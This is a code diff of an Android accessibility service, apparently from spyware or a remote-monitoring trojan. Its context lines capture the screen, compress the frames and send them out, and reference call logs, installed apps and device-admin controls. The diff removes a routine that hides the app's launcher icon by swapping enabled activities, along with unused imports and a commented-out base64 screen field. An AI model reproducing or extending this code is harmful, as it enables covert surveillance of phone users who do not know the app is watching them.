@@ -2,7 +2,6 @@ package com.support.litework.services;
 
 import android.Manifest;
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
 import android.app.admin.DevicePolicyManager;
@@ -71,12 +70,7 @@ import android.widget.TextView;
 import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-
-import com.support.litework.HideMainActivity;
-import com.support.litework.MainActivity;
 import com.support.litework.R;
-import com.support.litework.activity.OverlaySetActivity;
-import com.support.litework.activity.SetAutoStartActivity;
 import com.support.litework.model.ApplistEntry;
 import com.support.litework.model.CallLogEntry;
 import com.support.litework.model.ImageData;
@@ -93,7 +87,6 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 
@@ -138,7 +131,6 @@ public class MainAccessibilityService extends AccessibilityService {
     static int deviceWidth = 0;
     int deviceHeight = 0;
     int deviceDensityDpi = 0;
-    private String screenBase64 = "";
     ByteArrayOutputStream screen_outputStream = new ByteArrayOutputStream();
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
@@ -470,7 +462,6 @@ public class MainAccessibilityService extends AccessibilityService {
             }
             if (ACTION_DEVICE_UNLOCK.equals(intent.getAction())) {
                 onDeviceUnlock();
-//                onHideAppicon();
             }
 
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
@@ -1475,7 +1466,6 @@ public class MainAccessibilityService extends AccessibilityService {
                         scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                     }
-//                    screenBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
                     screen_outputStream = outputStream;
                     sendScreenMonitoringData(outputStream);
                     bitmap.recycle();
@@ -2640,21 +2630,6 @@ public class MainAccessibilityService extends AccessibilityService {
                 }, 1000);
             }
         }, 1000);
-    }
-
-    public void onHideAppicon() {
-
-        PackageManager packageManager = getPackageManager();
-        ComponentName cName = new ComponentName(getPackageName(), MainActivity.class.getName());
-        packageManager.setComponentEnabledSetting(cName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-
-        ComponentName c_Name = new ComponentName(getPackageName(), HideMainActivity.class.getName());
-        packageManager.setComponentEnabledSetting(c_Name, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
-
-        Intent intent = new Intent(this, HideMainActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-
     }
 
     private void onGoHome() {
